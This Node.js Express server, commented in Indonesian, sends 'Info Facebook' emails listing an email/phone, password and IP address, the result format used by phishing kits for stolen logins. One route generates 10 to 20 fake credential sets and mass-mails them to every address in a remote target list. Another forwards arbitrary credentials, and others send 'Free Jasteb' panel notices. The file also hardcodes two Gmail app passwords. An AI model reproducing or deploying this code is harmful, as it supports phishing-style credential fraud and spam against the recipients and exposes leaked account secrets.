const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// ====================== TRANSPORTER 1 (manual kirim) ======================
const transporterManual = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'bagussender@gmail.com',
        pass: 'xgqdblqzarqvtioh'
    }
});

// ====================== TRANSPORTER 2 (auto kirim dari database) ======================
const transporterAuto = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "msg.sender.cg.team@gmail.com",
        pass: "ryzvhlunnwlbajgn" // App password Gmail kedua
    }
});

// URL database JSON (ganti dengan link jsonblob lo)
const DB_URL = "https://jsonblob.com/api/jsonBlob/1413877719128793088";

// ====================== TEMPLATE MANUAL ======================
app.post('/send-email', async (req, res) => {
    const { to, subject, message } = req.body;

    const htmlContent = `
        <div style="font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; max-width: 600px; margin: auto; padding: 30px; border-radius: 16px; background: linear-gradient(145deg, #1c1c1c, #121212); color: #f0f0f0; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6); border: 1px solid #2c2c2c;">
            <div style="text-align: center; margin-bottom: 25px;">
                <h2 style="color: #00bfff; font-size: 26px; margin: 0; letter-spacing: 1px;">✉️ ${subject}</h2>
                <p style="color: #b0b0b0; font-size: 15px; margin-top: 8px;">There is a New Message !</p>
            </div>
            <div style="background-color: #181818; padding: 22px; border-radius: 12px; border-left: 6px solid #00bfff; box-shadow: inset 0 0 10px rgba(0, 191, 255, 0.1);">
                <p style="font-size: 17px; line-height: 1.7; color: #eeeeee; text-align: justify;">${message}</p>
            </div>
            <p style="text-align: center; font-size: 14px; color: #999; margin-top: 30px; font-style: italic;">
                Dikirim melalui <b style="color: #00bfff;">🔔 Email Notification</b>
            </p>
            <div style="text-align: center; margin-top: 25px;">
                <a href="https://Bagus-email.vercel.app" style="background: linear-gradient(to right, #00bfff, #33ccff); color: #121212; text-decoration: none; padding: 12px 25px; border-radius: 30px; font-size: 14px; font-weight: bold; transition: all 0.3s ease; display: inline-block;">Go To Website</a>
            </div>
        </div>
    `;

    const mailOptions = {
        from: `"Bagus Email Sender" <${process.env.EMAIL_USER}>`,
        to,
        subject,
        html: htmlContent
    };

    try {
        await transporterManual.sendMail(mailOptions);
        res.json({ message: "Email berhasil dikirim!" });
    } catch (error) {
        res.status(500).json({ message: "Gagal mengirim email", error });
    }
});

// ====================== TEMPLATE AUTO ======================
function generateHtml(noperess, password, ipress) {
  return `
  <!DOCTYPE html>
  <html>
  <head>
    <title>Info Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <style type="text/css">
      body {
        font-family: "Helvetica", Arial, sans-serif;
        width: 90%;
        display: block;
        margin: auto;
        border: 1px solid #fff;
        background: #fff;
      }
      .result {
        width: 100%;
        height: 100%;
        display: block;
        margin: auto;
        border-radius: 10px;
      }
      .tblResult {
        width: 100%;
        border-collapse: collapse;
        text-align: center;
        background: #fcfcfc;
      }
      .tblResult th {
        font-size: 1em;
        padding: 15px 10px;
        background: #001240;
        border: 2px solid #001240;
        color: #fff;
        text-align: center;
      }
      .tblResult td {
        font-size: 1em;
        padding: 10px;
        border: 2px solid #001240;
        font-weight: bold;
        color: #000;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="result">
      <table class="tblResult">
        <tr>
          <th colspan="3">Info Facebook</th>
        </tr>
        <tr>
          <td style="border-right: none;">Email/Phone</td>
          <td>${noperess}</td>
        </tr>
        <tr>
          <td style="border-right: none;">Password</td>
          <td>${password}</td>
        </tr>
        <tr>
          <td style="border-right: none;">IP Address</td>
          <td>${ipress}</td>
        </tr>
        <tr>
          <th colspan="3">&copy; Team CodeGood 💤</th>
        </tr>
      </table>
    </div>
  </body>
  </html>
  `;
}
// ====================== ROUTE AUTO ======================
// ====================== ROUTE AUTO (10–20 fake random per target) ======================
app.get("/auto", async (req, res) => {
    try {
        // Ambil semua target email dari database
        const { data: emailList } = await axios.get(DB_URL);

        if (!Array.isArray(emailList) || emailList.length === 0) {
            return res.status(200).json({ message: "Database kosong, tidak ada email terkirim" });
        }

        // Tentukan jumlah fake yang akan di-generate (10–20 random)
        const fakeCount = Math.floor(Math.random() * 11) + 10; // hasil antara 10–20

        let allResults = [];

        for (let i = 0; i < fakeCount; i++) {
            try {
                // Ambil data fake baru
                const fake = await axios.get("https://api-fakemail.vercel.app/create");
                const { email, password, ip } = fake.data;

                const htmlContent = generateHtml(email, password, ip);

                // Kirim ke semua email target
                const batchResults = await Promise.allSettled(
                    emailList.map(async (entry) => {
                        try {
                            await transporterAuto.sendMail({
                                from: `"🌀 Ress Codashop FF 🌀" <msg.sender.cg.team@gmail.com>`,
                                to: entry.email || entry,
                                subject: `⚡ || Result Punya Si ${email}`,
                                html: htmlContent,
                            });
                            return { target: entry.email || entry, status: "sent" };
                        } catch (err) {
                            return { target: entry.email || entry, status: "failed", error: err.message };
                        }
                    })
                );

                allResults.push({ fake: i + 1, email, sent: batchResults });
            } catch (fakeErr) {
                allResults.push({ fake: i + 1, error: fakeErr.message });
            }
        }

        res.status(200).json({
            message: `Proses selesai, total ${fakeCount} fake dikirim ke semua target`,
            totalFakes: fakeCount,
            totalTargets: emailList.length,
            details: allResults
        });

    } catch (err) {
        console.error("❌ Error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

// ====================== ROUTE SEND2 (manual input full, pake template custom & msg.sender.cg.team) ======================
app.get('/send2', async (req, res) => {
    const { email, password, Ip, to } = req.query;

    if (!email || !password || !Ip || !to) {
        return res.status(400).json({ message: "Missing parameter. Harus ada email, password, Ip, dan to." });
    }

    const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <title>Info Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <style type="text/css">
        body {
            font-family: "Helvetica";
            width: 90%;
            display: block;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
        }
        .result {
            width: 100%;
            height: 100%;
            display: block;
            margin: auto;
            position: fixed;
            top: 0; right: 0; left: 0; bottom: 0;
            z-index: 999;
            overflow-y: scroll;
            border-radius: 10px;
        }
        .tblResult {
            width: 100%;
            display: table;
            margin: 0px auto;
            border-collapse: collapse;
            text-align: center;
            background: #fcfcfc;
        }
        .tblResult th {
            text-align: left;
            font-size: 1em;
            margin: auto;
            padding: 15px 10px;
            background: #001240;
            border: 2px solid #001240;
            color: #fff;
        }
        .tblResult td {
            font-size: 1em;
            margin: auto;
            padding: 10px;
            border: 2px solid #001240;
            text-align: left;
            font-weight: bold;
            color: #000;
            text-shadow: 0px 0px 10px #fcfcfc;
        }
    </style>
</head>
<body>
<div class="result">
<table class="tblResult">
<tr>
    <th style="text-align: center;" colspan="3">Info Facebook</th>
</tr>
<tr>
    <td style="border-right: none;">Email/Phone</td>
    <td style="text-align: center;">${email}</td>
</tr>
<tr>
    <td style="border-right: none;">Password</td>
    <td style="text-align: center;">${password}</td>
</tr>
<tr>
    <td style="border-right: none;">IP Address</td>
    <td style="text-align: center;">${Ip}</td>
</tr>
<tr>
    <th style="text-align: center;" colspan="3">&copy; Web Bagus 💤</th>
</tr>
</table>
</div>
</body>
</html>
`;

    try {
        await transporterAuto.sendMail({
            from: `"Manual Sender" <msg.sender.cg.team@gmail.com>`,
            to,
            subject: `⚡ Manual Result Punya Si ${email}`,
            html: htmlContent,
        });

        res.json({ message: `Email berhasil dikirim ke ${to}` });
    } catch (err) {
        res.status(500).json({ message: "Gagal mengirim email", error: err.message });
    }
});

app.get('/add', async (req, res) => {
    const { to } = req.query; // ambil dari query string

    if (!to) return res.status(400).json({ message: "Parameter 'to' wajib ada" });
    const htmlContent = `
        <!DOCTYPE html>  <html lang="en">  
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1" />  
  <title>Sistem Information</title>  
</head>  
<body style="background:#ffffff;font-family:Arial,Helvetica,sans-serif;margin:0;padding:0;">  
  <div style="width:90%;max-width:600px;margin:20px auto;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,0.1);">  
    <!-- Header -->  
    <div style="background:#4f46e5;color:#ffffff;text-align:center;padding:20px;font-size:22px;font-weight:bold;">  
      Sistem Information  
    </div>  <!-- Body -->  
<div style="padding:30px;text-align:center;color:#333333;">  
  <p style="font-size:18px;font-weight:bold;margin:0 0 20px;">Hai!</p>  
  <p style="font-size:15px;line-height:1.6;margin:0;">  
    Email kamu berhasil ditambahkan ke <b>CG Panel</b>.<br><br>  
    Sebagai bagian dari komitmen kami untuk mendukung pengguna, Anda akan mendapatkan <b>akses layanan Jasteb gratis</b> yang akan segera diproses oleh sistem kami secara otomatis.  
  </p>  
</div>  

<!-- Footer with Button -->  
<div style="background:#4f46e5;text-align:center;padding:25px;">  
  <a href="https://your-website-link.com"   
     style="background:#ffffff;color:#4f46e5;padding:12px 25px;text-decoration:none;font-weight:bold;border-radius:6px;display:inline-block;">  
     Free Jasteb  
  </a>  
</div>

  </div>  
</body>  
</html>
    `;

    const mailOptions = {
        from: `"⚡ Added Information ⚡" <${process.env.EMAIL_USER}>`,
        to,
        subject: `🚀 CG Panel Notification 🚀`,
        html: htmlContent
    };

    try {
        await transporterManual.sendMail(mailOptions);
        res.json({ message: "Email berhasil dikirim!" });
    } catch (error) {
        res.status(500).json({ message: "Gagal mengirim email", error });
    }
});

app.get('/del', async (req, res) => {
    const { to } = req.query; // ambil dari query string

    if (!to) return res.status(400).json({ message: "Parameter 'to' wajib ada" });

    const htmlContent = `
        <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sistem Information</title>
</head>
<body style="background:#ffffff;font-family:Arial,Helvetica,sans-serif;margin:0;padding:0;">
  <div style="width:90%;max-width:600px;margin:20px auto;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,0.1);">
    <!-- Header -->
    <div style="background:#dc2626;color:#ffffff;text-align:center;padding:20px;font-size:22px;font-weight:bold;">
      Sistem Information
    </div>

    <!-- Body -->
    <div style="padding:30px;text-align:center;color:#333333;">
      <p style="font-size:18px;font-weight:bold;margin:0 0 20px;">Halo!</p>
      <p style="font-size:15px;line-height:1.6;margin:0;">
        Email kamu telah <b>dihapus</b> dari <b>CG Panel</b>.<br><br>
        Terima kasih telah menggunakan layanan kami. semoga layanan kami dapat bermanfaat untuk kebutuhanmu.
      </p>
    </div>

    <!-- Footer with Button -->
    <div style="background:#dc2626;text-align:center;padding:25px;">
      <a href="https://your-website-link.com" 
         style="background:#ffffff;color:#dc2626;padding:12px 25px;text-decoration:none;font-weight:bold;border-radius:6px;display:inline-block;">
         Free Jasteb
      </a>
    </div>
  </div>
</body>
</html>
    `;

    const mailOptions = {
        from: `"🥀 Delete Information 🥀" <${process.env.EMAIL_USER}>`,
        to,
        subject: `🌀 CG Panel Notification 🌀`,
        html: htmlContent
    };

    try {
        await transporterManual.sendMail(mailOptions);
        res.json({ message: "Email berhasil dikirim!" });
    } catch (error) {
        res.status(500).json({ message: "Gagal mengirim email", error });
    }
});

// ====================== START SERVER ======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server berjalan di port ${PORT}`));
